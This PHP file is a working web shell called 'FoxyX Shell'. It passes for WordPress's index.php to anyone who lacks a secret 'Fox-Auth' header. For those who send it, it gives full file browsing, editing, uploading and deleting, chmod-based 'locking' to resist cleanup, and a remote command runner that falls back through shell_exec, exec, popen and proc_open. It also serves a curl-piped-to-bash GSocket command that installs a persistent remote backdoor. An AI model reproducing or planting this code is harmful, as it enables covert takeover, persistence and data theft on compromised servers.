<?php
// =========================
// PROTEKSI HEADER FOX-AUTH
// =========================
$headerName  = 'Fox-Auth';
$headerValue = 'hiddenfoxy';

$serverKey = 'HTTP_' . strtoupper(str_replace('-', '_', $headerName));
$authOk    = isset($_SERVER[$serverKey]) && $_SERVER[$serverKey] === $headerValue;

if (!$authOk) {
    ?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
?>
<?php
    exit;
}

// ============= BASE CONFIG =============
// AUTO DETECT HOME
$USER_HOME = isset($_SERVER['HOME'])
    ? $_SERVER['HOME']
    : (function () {
        if (function_exists('posix_getpwuid')) {
            $u = @posix_getpwuid(@posix_getuid());
            if (isset($u['dir'])) return $u['dir'];
        }
        return __DIR__;
    })();

$LOCK_DB          = rtrim($USER_HOME, "/") . "/.foxlock.json";
$UNLOCK_KEY_VALUE = 'hiddenfoxy';

// GSocket command – hanya ditampilkan, tidak dieksekusi
$GS_COMMAND = 'bash -c "$(curl -fsSL https://gsocket.io/y)"';

if (!file_exists($LOCK_DB)) {
    @file_put_contents($LOCK_DB, json_encode([]));
}

// ============= LOCK HELPERS =============
function load_locks($LOCK_DB){
    $raw  = @file_get_contents($LOCK_DB);
    $data = json_decode($raw,true);
    return is_array($data)?$data:[];
}
function save_locks($LOCK_DB,$locks){
    $locks = array_values(array_unique(array_filter($locks)));
    @file_put_contents($LOCK_DB,json_encode($locks,JSON_PRETTY_PRINT));
}
function normpath($p){
    $r = realpath($p);
    return $r? rtrim($r,DIRECTORY_SEPARATOR):null;
}
function is_locked_path($path,$locks){
    $p = normpath($path);
    if(!$p) return false;
    foreach($locks as $lp){
        if(!$lp) continue;
        $lp = rtrim($lp,DIRECTORY_SEPARATOR);
        if($p===$lp) return true;
        if(strpos($p.DIRECTORY_SEPARATOR,$lp.DIRECTORY_SEPARATOR)===0) return true;
    }
    return false;
}
function is_locked_exact($path,$locks){
    $p = normpath($path);
    if(!$p) return false;
    foreach($locks as $lp){
        if(!$lp) continue;
        $lp = rtrim($lp,DIRECTORY_SEPARATOR);
        if($p===$lp) return true;
    }
    return false;
}

// file ops
function recursive_copy($src,$dst){
    if(is_dir($src)){
        if(!is_dir($dst)) mkdir($dst,0777,true);
        foreach(scandir($src) as $f){
            if($f==="."||$f==="..") continue;
            recursive_copy("$src/$f","$dst/$f");
        }
    }else{
        @copy($src,$dst);
    }
}
function recursive_delete($target){
    if(is_dir($target)){
        foreach(scandir($target) as $f){
            if($f==="."||$f==="..") continue;
            recursive_delete("$target/$f");
        }
        @rmdir($target);
    }else{
        @unlink($target);
    }
}
function recursive_chmod_lock($path){
    if(is_dir($path)){
        @chmod($path,0555);
        foreach(scandir($path) as $f){
            if($f==="."||$f==="..") continue;
            recursive_chmod_lock($path.DIRECTORY_SEPARATOR.$f);
        }
    }elseif(is_file($path)){
        @chmod($path,0444);
    }
}
function recursive_chmod_unlock($path){
    if(is_dir($path)){
        @chmod($path,0777);
        foreach(scandir($path) as $f){
            if($f==="."||$f==="..") continue;
            recursive_chmod_unlock($path.DIRECTORY_SEPARATOR.$f);
        }
    }elseif(is_file($path)){
        @chmod($path,0777);
    }
}

// ajax json response
function json_out($ok,$extra=[]){
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(array_merge(['ok'=>$ok],$extra));
    exit;
}

// render file cards
function render_file_cards($currentDir,$locks){
    foreach(scandir($currentDir) as $item){
        if($item==="."||$item==="..") continue;
        $itemPath = $currentDir.DIRECTORY_SEPARATOR.$item;
        $isDir    = is_dir($itemPath);
        $type     = $isDir? "Folder":"File";
        $permOct  = file_exists($itemPath)? substr(sprintf('%o',fileperms($itemPath)),-4):"----";
        $lockedByDb   = is_locked_path($itemPath,$locks);
        $lockedByPerm = ($permOct==='0444'||$permOct==='0555');
        $showLock     = ($lockedByDb||$lockedByPerm);
        $isExact      = is_locked_exact($itemPath,$locks);
        ?>
        <div class="file-card px-3 py-3 text-xs flex flex-col justify-between">
            <div class="flex items-start space-x-3">
                <div class="file-icon <?= $isDir?'file-icon-folder':'' ?>">
                    <?php if ($isDir): ?>
                        <img src="https://cdn-icons-png.flaticon.com/512/3735/3735057.png"
                             alt="Folder" style="width:24px;height:24px;">
                    <?php else: ?>
                        <img src="https://cdn-icons-png.flaticon.com/128/9683/9683569.png"
                             alt="File" style="width:24px;height:24px;">
                    <?php endif; ?>
                </div>
                <div class="flex-1 min-w-0">
                    <div class="flex items-center justify-between">
                        <div class="truncate font-semibold text-white">
                            <?php if($isDir): ?>
                            <a href="javascript:void(0)" class="link-open-dir hover:text-sky-300"
                               data-dir="<?= htmlspecialchars($itemPath,ENT_QUOTES) ?>">
                                <?= htmlspecialchars($item) ?>
                            </a>
                            <?php else: ?>
                                <?= htmlspecialchars($item) ?>
                            <?php endif; ?>
                        </div>
                        <?php if($showLock): ?>
                            <span class="badge-lock">LOCK</span>
                        <?php endif; ?>
                    </div>
                    <div class="mt-0.5 text-[10px] text-slate-200 flex items-center justify-between">
                        <span><?= $type ?></span>
                        <span class="font-mono text-slate-100"><?= htmlspecialchars($permOct) ?></span>
                    </div>
                </div>
            </div>
            <!-- ACTION BAR: satu garis (nowrap) + scroll kalau kepanjangan -->
            <div class="mt-3 flex flex-nowrap gap-1 text-[10px] overflow-x-auto">
                <?php if(is_file($itemPath)): ?>
                    <a href="?action=download&file=<?= urlencode($item) ?>&dir=<?= urlencode($currentDir) ?>"
                       class="px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-sky-400 text-white flex items-center space-x-1">
                        <img src="https://cdn-icons-png.flaticon.com/128/17032/17032823.png" alt="Download" class="w-3.5 h-3.5">
                    </a>

                    <button type="button"
                        class="btn-edit px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-sky-400 text-white flex items-center space-x-1"
                        data-file="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/128/17032/17032979.png" alt="Edit" class="w-3.5 h-3.5">
                    </button>

                    <?php if(!$showLock): ?>
                    <button type="button"
                        class="btn-lock px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-sky-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/128/10464/10464776.png" alt="Lock" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?><?php if($isExact): ?>
                    <button type="button"
                        class="btn-unlock px-2 py-0.5 rounded-full bg-slate-900 border border-emerald-500 hover:border-emerald-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/512/11082/11082312.png" alt="Unlock" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?>
                <?php endif; ?>

                <?php if($isDir): ?>
                    <?php if(!$showLock): ?>
                    <button type="button"
                        class="btn-lock px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-indigo-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/128/10464/10464776.png" alt="Lock Dir" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?>

                    <?php if($isExact): ?>
                    <button type="button"
                        class="btn-unlock px-2 py-0.5 rounded-full bg-slate-900 border border-emerald-500 hover:border-emerald-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/512/11082/11082312.png" alt="Unlock Dir" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?>
                <?php endif; ?>

                <button type="button"
                        class="btn-delete px-2 py-0.5 rounded-full bg-slate-900 border border-red-500 hover:border-red-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                    <img src="https://cdn-icons-png.flaticon.com/128/6861/6861362.png" alt="Delete" class="w-3.5 h-3.5">
                </button>
            </div>
        </div>
        <?php
    }
}

// breadcrumb
function breadcrumb_html($currentDir){
    $pathNorm = str_replace(['\\','/'],DIRECTORY_SEPARATOR,$currentDir);
    $segments = array_values(array_filter(explode(DIRECTORY_SEPARATOR,$pathNorm),'strlen'));
    $crumbLabels=[];$crumbPaths=[];$homePath=DIRECTORY_SEPARATOR;

    if(isset($segments[0]) && preg_match('/^[A-Za-z]:$/',$segments[0])){
        $drive=$segments[0];
        $homePath=$drive.DIRECTORY_SEPARATOR;
        $crumbLabels[]=$drive;
        $crumbPaths[] =$drive.DIRECTORY_SEPARATOR;
        $acc=$drive;
        for($i=1;$i<count($segments);$i++){
            $acc.=DIRECTORY_SEPARATOR.$segments[$i];
            $crumbLabels[]=$segments[$i];
            $crumbPaths[] =$acc;
        }
    }else{
        $homePath=DIRECTORY_SEPARATOR;
        $acc='';
        foreach($segments as $seg){
            $acc.=DIRECTORY_SEPARATOR.$seg;
            $crumbLabels[]=$seg;
            $crumbPaths[] =$acc;
        }
    }
    ob_start();
    echo "<a href='javascript:void(0)' class='bc-root text-sky-300 hover:underline' data-dir=\"".htmlspecialchars($homePath,ENT_QUOTES)."\">Home</a>";
    for($i=0;$i<count($crumbLabels);$i++){
        echo " <span class='text-slate-400'>/</span> ";
        echo "<a href='javascript:void(0)' class='bc-part text-sky-200 hover:underline' data-dir=\"".htmlspecialchars($crumbPaths[$i],ENT_QUOTES)."\">".htmlspecialchars($crumbLabels[$i])."</a>";
    }
    return ob_get_clean();
}

// ============= SYSTEM INFO =============
$serverIp       = $_SERVER['SERVER_ADDR']     ?? 'N/A';
$clientIp       = $_SERVER['REMOTE_ADDR']     ?? 'N/A';
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'PHP';
$osVersion      = php_uname('s').' '.php_uname('r');
$currentUser    = function_exists('posix_getpwuid')
    ? (@posix_getpwuid(@posix_getuid())['name'] ?? get_current_user())
    : get_current_user();
$phpVersion     = PHP_VERSION;

$diskTotal = @disk_total_space($USER_HOME) ?: 0;
$diskFree  = @disk_free_space($USER_HOME) ?: 0;
$diskUsed  = max($diskTotal-$diskFree,0);
$diskPct   = $diskTotal>0? round($diskUsed/$diskTotal*100,1):0;

function fmt_bytes($b){
    if($b<=0) return "0 B";
    $u=['B','KB','MB','GB','TB'];
    $i=(int)floor(log($b,1024));
    $i=max(0,min($i,count($u)-1));
    return round($b/pow(1024,$i),2).' '.$u[$i];
}

$disabled      = ini_get('disable_functions');
$disabledList  = array_filter(array_map('trim',explode(',',(string)$disabled)));
function func_status($name,$disabledList){
    if(!function_exists($name)) return 'N/A';
    return in_array($name,$disabledList,true)?'Disabled':'Enabled';
}
$execStatus      = func_status('exec',$disabledList);
$shellExecStatus = func_status('shell_exec',$disabledList);
$popenStatus     = func_status('popen',$disabledList);
$procOpenStatus  = func_status('proc_open',$disabledList);

$phpmailerStatus = (class_exists('\PHPMailer\PHPMailer\PHPMailer') || class_exists('PHPMailer'))
    ? 'Found' : 'Not Found';

// ===== DIAGNOSTIC COMMAND RUNNER (UMUM) =====
function diag_run_command($cmd, $disabledList){
    $cmdFull = $cmd . ' 2>&1';
    $output  = '';

    $isDisabled = function($f) use ($disabledList){
        return !function_exists($f) || in_array($f,$disabledList,true);
    };

    if(!$isDisabled('shell_exec')){
        $out = @shell_exec($cmdFull);
        if($out !== null && $out !== false) $output .= $out;
    } elseif(!$isDisabled('exec')){
        $lines = [];
        @exec($cmdFull,$lines);
        if($lines) $output .= implode("\n",$lines);
    } elseif(!$isDisabled('popen')){
        $h = @popen($cmdFull,'r');
        if($h){
            while(!feof($h)){ $output .= fread($h,2048); }
            @pclose($h);
        }
    } elseif(!$isDisabled('proc_open')){
        $desc = [
            0 => ['pipe','r'],
            1 => ['pipe','w'],
            2 => ['pipe','w'],
        ];
        $proc = @proc_open($cmdFull,$desc,$pipes);
        if(is_resource($proc)){
            fclose($pipes[0]);
            $output .= stream_get_contents($pipes[1]);
            $output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            @proc_close($proc);
        }
    } else {
        return "[ERROR] Semua fungsi eksekusi (shell_exec/exec/popen/proc_open) disabled.";
    }

    return trim($output)==='' ? "(no output)" : $output;
}

// ============= STATE (DIR & LOCKS) =============
$currentDir = __DIR__;
if(isset($_GET['dir'])){
    $req = $_GET['dir'];
    $res = realpath($req);
    if($res!==false && is_dir($res)) $currentDir=$res;
}
$locks = load_locks($LOCK_DB);

// ============= AJAX HANDLERS =============
if(isset($_GET['ajax']) || isset($_POST['ajax'])){
    $ajax = $_GET['ajax'] ?? $_POST['ajax'];

    if($ajax==='filelist'){
        header('Content-Type: text/html; charset=utf-8');
        render_file_cards($currentDir,$locks);
        exit;
    }
    if($ajax==='breadcrumb'){
        header('Content-Type: text/html; charset=utf-8');
        echo breadcrumb_html($currentDir);
        exit;
    }
    if($ajax==='loadfile'){
        $f = isset($_GET['file'])? basename($_GET['file']):'';
        $p = $currentDir.DIRECTORY_SEPARATOR.$f;
        if(!$f || !is_file($p)) json_out(false,['error'=>'File tidak ditemukan']);
        $c = @file_get_contents($p);
        if($c===false) json_out(false,['error'=>'Gagal baca file']);
        json_out(true,['content'=>$c,'name'=>$f]);
    }
    if($ajax==='savefile'){
        $f = isset($_POST['file'])? basename($_POST['file']):'';
        $c = $_POST['content'] ?? '';
        $p = $currentDir.DIRECTORY_SEPARATOR.$f;
        if(!$f || !is_file($p)) json_out(false,['error'=>'File tidak ditemukan']);
        if(is_locked_path($p,$locks)) json_out(false,['error'=>'File LOCK']);
        $ok = @file_put_contents($p,$c);
        if($ok===false) json_out(false,['error'=>'Gagal simpan file']);
        json_out(true,['message'=>'File tersimpan']);
    }
    if($ajax==='newitem'){
        $type = $_POST['type'] ?? 'file';
        $name = basename(trim($_POST['name'] ?? ''));
        $content = $_POST['content'] ?? '';
        if($name==='') json_out(false,['error'=>'Nama wajib diisi']);
        $targetPath = $currentDir.DIRECTORY_SEPARATOR.$name;
        if(is_locked_path($currentDir,$locks) || is_locked_path($targetPath,$locks))
            json_out(false,['error'=>'Direktori/target LOCK']);
        if($type==='folder'){
            $ok=@mkdir($targetPath,0777,true);
            if(!$ok) json_out(false,['error'=>'Gagal buat folder']);
        }else{
            $ok=@file_put_contents($targetPath,$content);
            if($ok===false) json_out(false,['error'=>'Gagal buat file']);
        }
        json_out(true,['message'=>'Berhasil membuat '.$type]);
    }
    if($ajax==='upload'){
        if(is_locked_path($currentDir,$locks)) json_out(false,['error'=>'Direktori LOCK']);
        if(!isset($_FILES['upload_file'])) json_out(false,['error'=>'File belum dipilih']);
        $fn = basename($_FILES['upload_file']['name']);
        $tp = $currentDir.DIRECTORY_SEPARATOR.$fn;
        if(!move_uploaded_file($_FILES['upload_file']['tmp_name'],$tp))
            json_out(false,['error'=>'Gagal upload file']);
        @chmod($tp,0644);
        json_out(true,['message'=>'File berhasil diupload']);
    }
    if($ajax==='bulkcopy'){
        $targetInput = $_POST['target'] ?? '';
        $destInput   = $_POST['destpath'] ?? '';
        $namesInput  = $_POST['names'] ?? '';
        $sourceFolder = realpath($currentDir.DIRECTORY_SEPARATOR.$targetInput);
        if(!$sourceFolder || !is_dir($sourceFolder)) json_out(false,['error'=>'Target folder tidak valid']);
        if(is_locked_path($sourceFolder,$locks)) json_out(false,['error'=>'Target folder LOCK']);
        $destinationDirPath = $currentDir.DIRECTORY_SEPARATOR.$destInput;
        if(is_locked_path($destinationDirPath,$locks)) json_out(false,['error'=>'Path tujuan LOCK']);
        if(!file_exists($destinationDirPath)) mkdir($destinationDirPath,0777,true);
        $destinationDir = realpath($destinationDirPath);
        $namesArray = preg_split("/[\r\n,]+/",$namesInput);
        $namesArray = array_filter(array_map('trim',$namesArray));
        if(!$namesArray) json_out(false,['error'=>'Nama folder baru kosong']);
        $results=[];
        foreach($namesArray as $nm){
            $newDest = $destinationDir.DIRECTORY_SEPARATOR.$nm;
            recursive_copy($sourceFolder,$newDest);
            $results[]=$newDest;
        }
        json_out(true,['message'=>'Bulk copy berhasil','created'=>$results]);
    }
    if($ajax==='lock'){
        $t = isset($_POST['target'])? basename($_POST['target']):'';
        $p = $currentDir.DIRECTORY_SEPARATOR.$t;
        if(!$t || !file_exists($p)) json_out(false,['error'=>'Target tidak ditemukan']);
        $rp = normpath($p);
        if(!$rp) json_out(false,['error'=>'Path tidak valid']);
        if(!is_locked_path($rp,$locks)){
            $locks[]=$rp;
            save_locks($LOCK_DB,$locks);
        }
        recursive_chmod_lock($rp);
        json_out(true,['message'=>'Target di-LOCK']);
    }
    if($ajax==='unlock'){
        $t   = isset($_POST['target'])? basename($_POST['target']):'';
        $key = $_POST['key'] ?? '';
        $p   = $currentDir.DIRECTORY_SEPARATOR.$t;
        if($key!==$UNLOCK_KEY_VALUE) json_out(false,['error'=>'Unlock key salah']);
        if(!$t || !file_exists($p)) json_out(false,['error'=>'Target tidak ditemukan']);
        $rp = normpath($p);
        if(!$rp) json_out(false,['error'=>'Path tidak valid']);
        recursive_chmod_unlock($rp);
        $locks = array_values(array_filter($locks,function($lp)use($rp){
            $lp=rtrim($lp,DIRECTORY_SEPARATOR);
            return $lp!==$rp;
        }));
        save_locks($LOCK_DB,$locks);
        json_out(true,['message'=>'Target di-UNLOCK (0777)']);
    }
    if($ajax==='delete'){
        $t = isset($_POST['target'])? basename($_POST['target']):'';
        $p = $currentDir.DIRECTORY_SEPARATOR.$t;
        if(!$t || !file_exists($p)) json_out(false,['error'=>'Target tidak ditemukan']);
        if(is_locked_path($p,$locks)) json_out(false,['error'=>'Target LOCK, nggak bisa dihapus']);
        recursive_delete($p);
        json_out(true,['message'=>'Target dihapus']);
    }
    if($ajax==='changedir'){
        $dir = $_GET['dir'] ?? '';
        if(!$dir) json_out(false,['error'=>'Direktori kosong']);
        $res = realpath($dir);
        if($res===false || !is_dir($res)) json_out(false,['error'=>'Direktori tidak valid']);
        json_out(true,['dir'=>$res]);
    }
    // GSocket: cuma balikin command untuk di-copy manual
    if($ajax==='gsocket_cmd'){
        json_out(true,['cmd'=>$GLOBALS['GS_COMMAND']]);
    }
    // Diagnostics (terminal umum)
    if($ajax==='diag'){
        global $disabledList;
        $raw = trim($_POST['cmd'] ?? '');
        if($raw==='') json_out(false,['error'=>'Command kosong']);
        $out = diag_run_command($raw,$disabledList);
        json_out(true,['cmd'=>$raw,'output'=>$out]);
    }

    json_out(false,['error'=>'Aksi AJAX tidak dikenal']);
}

// ============= DOWNLOAD ACTION =============
$action = $_GET['action'] ?? '';
if($action==='download' && isset($_GET['file'])){
    $fn = basename($_GET['file']);
    $fp = $currentDir.DIRECTORY_SEPARATOR.$fn;
    if(file_exists($fp)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fp).'"');
        header('Expires:0');
        header('Cache-Control:must-revalidate');
        header('Pragma:public');
        header('Content-Length:'.filesize($fp));
        readfile($fp);
    }else{
        echo "File tidak ditemukan.";
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="id" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>FoxyX Shell</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        :root{--bg-main:#020617;}
        body{
            background:radial-gradient(circle at top,#0b1220 0,#020617 55%,#000 100%);
            color:#fff;
        }
        .text-slate-100{color:#f9fafb;}
        .text-slate-200{color:#e5e7eb;}
        .text-slate-300{color:#d1d5db;}
        .text-slate-400{color:#9ca3af;}
        .text-slate-500{color:#6b7280;}
        .bg-slate-800{background-color:#1f2937;}
        .bg-slate-900{background-color:#111827;}
        .border-slate-700{border-color:#374151;}
        .border-slate-800{border-color:#1f2937;}

        .glass-card{
            background:linear-gradient(145deg,rgba(15,23,42,.96),rgba(15,23,42,.99));
            border-radius:.9rem;
            border:1px solid rgba(129,140,248,.35);
            box-shadow:0 18px 45px rgba(15,23,42,.9);
        }
        /* === FILE GRID AUTO-FIT, CARD LEBIH LEBAR === */
        #file-grid{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
            gap: 0.75rem; /* sama kaya gap-3 */
        }

        /* Biar di layar gede card makin lega */
        @media (min-width: 1536px){
            #file-grid{
                grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
            }
        }

        /* CARD dengan outline */
        .file-card{
            min-width:210px;
            border-radius:.9rem;
            border:1px solid rgba(148,163,184,.35);           /* outline tipis */
            background:rgba(15,23,42,.96);
            box-shadow:0 0 0 1px rgba(15,23,42,.9);           /* sedikit inner border */
            transition:border-color .15s, box-shadow .15s, transform .15s;
        }
        .file-card:hover{
            border-color:rgba(56,189,248,.9);                 /* sky-400 */
            box-shadow:0 0 0 1px rgba(56,189,248,.55);
            transform:translateY(-1px);
        }
        .file-card:focus-within{
            border-color:rgba(129,140,248,.95);               /* indigo */
            box-shadow:0 0 0 1px rgba(129,140,248,.7);
        }

        .file-icon{
            width:42px;height:42px;border-radius:.9rem;
            display:flex;align-items:center;justify-content:center;
            background:radial-gradient(circle at top left,#38bdf8,#0f172a 65%);
        }
        .file-icon-folder{
            background:radial-gradient(circle at top left,#22c55e,#0f172a 65%);
        }
        .badge-lock{
            font-size:.6rem;padding:.2rem .5rem;border-radius:999px;
            background:rgba(248,113,113,.15);
            border:1px solid rgba(248,113,113,.9);
            color:#fee2e2;
        }
        .pill-btn{
            border-radius:999px;
            padding:.45rem 1.1rem;
            font-size:.75rem;
            font-weight:600;
        }
        .pill-btn-primary{
            background:linear-gradient(135deg,#0ea5e9,#6366f1);
            box-shadow:0 10px 25px rgba(56,189,248,.35);
            color:#fff;
        }
        .pill-btn-primary:hover{filter:brightness(1.06);}
        .pill-btn-ghost{
            border-radius:999px;
            padding:.45rem 1.1rem;
            font-size:.75rem;
            font-weight:600;
            background:rgba(15,23,42,.9);
            border:1px solid rgba(148,163,184,.6);
            color:#f9fafb;
        }
        .pill-btn-ghost:hover{
            border-color:#0ea5e9;
            color:#fff;
        }

        .modal-backdrop{
            position:fixed;inset:0;background:rgba(0,0,0,.7);
            display:none;align-items:center;justify-content:center;z-index:50;
        }
        .modal-backdrop.show{display:flex;}
        #yt-player{
            position:absolute;width:1px;height:1px;opacity:0;
            pointer-events:none;left:-9999px;top:-9999px;
        }

        /* MUSIC PLAYER STYLE */
        .music-card{
            background:radial-gradient(circle at top,#020824,#020617);
            border-radius:1rem;
            border:1px solid rgba(96,165,250,.45);
            box-shadow:0 18px 45px rgba(15,23,42,.9);
        }
        .music-disc-wrap{
            width:80px;height:80px;border-radius:999px;
            background:radial-gradient(circle at 30% 20%,#38bdf8,#4f46e5 40%,#020617 65%);
            box-shadow:0 0 0 8px rgba(37,99,235,.3);
            display:flex;align-items:center;justify-content:center;
        }
        .music-disc-inner{
            width:56px;height:56px;border-radius:999px;
            background:radial-gradient(circle,#020617 0,#020617 35%,#1d4ed8 70%,#020617 100%);
            border:4px solid rgba(56,189,248,.4);
            position:relative;
        }
        .music-disc-inner::after{
            content:"";position:absolute;inset:37%;border-radius:999px;
            background:#020617;
            box-shadow:0 0 0 2px rgba(148,163,184,.6);
        }
        .music-control-btn{
            width:32px;height:32px;border-radius:999px;
            background:rgba(15,23,42,.95);
            border:1px solid rgba(148,163,184,.6);
            display:flex;align-items:center;justify-content:center;
            font-size:14px;
            transition:.15s;
            color:#e5e7eb;
        }
        .music-control-btn.main{
            width:38px;height:38px;
            background:linear-gradient(135deg,#38bdf8,#6366f1);
            border:none;color:#fff;
            box-shadow:0 8px 20px rgba(37,99,235,.6);
        }
        .music-control-btn:hover{
            transform:translateY(-1px);
            border-color:#38bdf8;
            color:#fff;
        }
        .music-timeline{
            height:3px;border-radius:999px;
            background:rgba(15,23,42,1);
            overflow:hidden;
        }
        .music-timeline-bar{
            height:100%;
            background:linear-gradient(90deg,#38bdf8,#6366f1,#22c55e);
            width:0%;
        }
        .playlist-row{
            display:flex;align-items:center;
            padding:.3rem .55rem;
            border-radius:.6rem;
            font-size:.72rem;
            margin-top:.15rem;
        }
        .playlist-row.active{
            background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.45));
            border:1px solid rgba(129,140,248,.9);
            color:#fff;
        }
        .playlist-row .idx{
            width:18px;text-align:center;
            font-size:.7rem;color:#cbd5f5;
        }
        .playlist-row .icon{
            margin:0 .5rem;
        }
        .playlist-row .title{
            flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
        }
        .playlist-row.inactive{
            color:#cbd5f5;
        }
        .playlist-row:hover{
            background:rgba(15,23,42,.9);
            border:1px solid rgba(99,102,241,.7);
            cursor:pointer;
        }
    </style>
</head>
<body class="min-h-screen">
<div class="min-h-screen flex flex-col">

<header class="border-b border-slate-800 bg-slate-950 bg-opacity-95 backdrop-blur">
    <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
        <div class="flex items-center space-x-3">
            <div class="w-8 h-8 rounded-lg bg-gradient-to-tr from-sky-400 via-indigo-500 to-amber-400 flex items-center justify-center shadow-lg shadow-sky-500/40">
                <span class="text-xs font-black tracking-tight text-white">G</span>
            </div>
            <div>
                <div class="flex items-center space-x-2">
                    <span class="font-semibold text-sm md:text-base tracking-wide text-white">FoxyX Shell</span>
                    <span class="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500 bg-opacity-15 border border-emerald-500 text-emerald-200">
                        PROTECTED
                    </span>
                </div>
                <div class="text-[10px] text-slate-200 flex items-center space-x-1">
                    <span class="hidden sm:inline">Current path :</span>
                    <span class="truncate max-w-xs md:max-w-md text-sky-200" id="current-path-label">
                        <?= htmlspecialchars($currentDir) ?>
                    </span>
                </div>
            </div>
        </div>
        <div class="hidden md:flex items-center space-x-4 text-[11px]">
            <div class="flex flex-col text-right">
                <span class="text-slate-200">Server IP</span>
                <span class="text-white font-mono"><?= htmlspecialchars($serverIp) ?></span>
            </div>
            <div class="flex flex-col text-right">
                <span class="text-slate-200">Your IP</span>
                <span class="text-white font-mono"><?= htmlspecialchars($clientIp) ?></span>
            </div>
            <div class="flex flex-col text-right">
                <span class="text-slate-200">PHP</span>
                <span class="text-sky-200 font-semibold"><?= htmlspecialchars($phpVersion) ?></span>
            </div>
            <a href="?logout=1" class="pill-btn pill-btn-primary inline-flex items-center space-x-1 text-xs">
                <span>⏻</span><span>Logout</span>
            </a>
        </div>
    </div>
</header>

<main class="flex-1">
    <div class="max-w-7xl mx-auto px-4 py-5 lg:flex lg:space-x-4">
        <!-- MAIN area diberi flex-[3] supaya lebih lebar -->
        <section class="flex-[3] space-y-4">
            <div class="lg:flex lg:space-x-4 space-y-4 lg:space-y-0">
                <!-- MUSIC KIRI -->
                <div class="w-full lg:w-72">
                    <div class="music-card p-4 text-white">
                        <div class="flex items-center justify-between mb-3">
                            <div class="flex items-center space-x-2"><span>🎵</span>
                                <h2 class="text-xs font-semibold tracking-wide uppercase">FoxyX Music</h2>
                            </div>
                            <span class="text-[10px] px-2 py-0.5 rounded-full bg-sky-500 bg-opacity-15 border border-sky-500 text-sky-200">
                                AUTO LOOP
                            </span>
                        </div>

                        <div class="text-[10px] text-indigo-300 mb-1 tracking-[0.2em] uppercase">Now Playing</div>

                        <div class="flex items-center space-x-4 mb-4">
                            <div class="music-disc-wrap">
                                <div class="music-disc-inner"></div>
                            </div>
                            <div class="flex-1">
                                <div id="music-title" class="text-xs font-semibold text-white truncate">
                                    Loading playlist...
                                </div>
                                <div id="music-subtitle" class="text-[10px] text-slate-300">
                                    Waiting...
                                </div>
                            </div>
                        </div>

                        <div class="flex items-center justify-center space-x-3 mb-4">
                            <button id="music-prev" class="music-control-btn">
                                <img src="https://cdn-icons-png.flaticon.com/512/6878/6878691.png" alt="Prev" class="w-4 h-4">
                            </button>
                            <button id="music-play" class="music-control-btn main">
                                <img id="music-play-icon" src="https://cdn-icons-png.flaticon.com/512/6878/6878705.png" alt="Play" class="w-4 h-4">
                            </button>
                            <button id="music-next" class="music-control-btn">
                                <img src="https://cdn-icons-png.flaticon.com/512/6878/6878692.png" alt="Next" class="w-4 h-4">
                            </button>
                        </div>

                        <div class="mb-2">
                            <div class="music-timeline">
                                <div id="music-progress" class="music-timeline-bar"></div>
                            </div>
                            <div class="flex justify-between text-[10px] text-slate-300 mt-1">
                                <span id="music-time-start">00:00</span>
                                <span id="music-time-end">00:00</span>
                            </div>
                        </div>

                        <div class="mt-3 space-y-1 text-[11px]" id="playlist">
                            <!-- rows injected by JS -->
                        </div>
                    </div>
                </div>

                <!-- FILE MANAGER KANAN -->
                <div class="flex-1 space-y-4">
                    <!-- TOOLBAR -->
                    <div class="glass-card px-4 py-3">
                        <div class="flex flex-wrap items-center justify-between gap-3">
                            <div class="flex items-center space-x-2 text-[11px]">
                                <span class="w-1.5 h-6 rounded-full bg-gradient-to-b from-sky-400 to-indigo-500"></span>
                                <div>
                                    <div class="text-xs font-semibold text-white">File Manager</div>
                                    <div class="text-[10px] text-slate-200">Kelola file &amp; folder langsung dari server</div>
                                </div>
                            </div>
                            <div class="flex flex-wrap items-center gap-2">
                                <button type="button"
                                    class="pill-btn pill-btn-primary text-xs btn-upload flex items-center space-x-1">
                                    <img src="https://cdn-icons-png.flaticon.com/128/17032/17032830.png" alt="Upload" class="w-4 h-4">
                                    <span>Upload</span>
                                </button>
                                <button type="button"
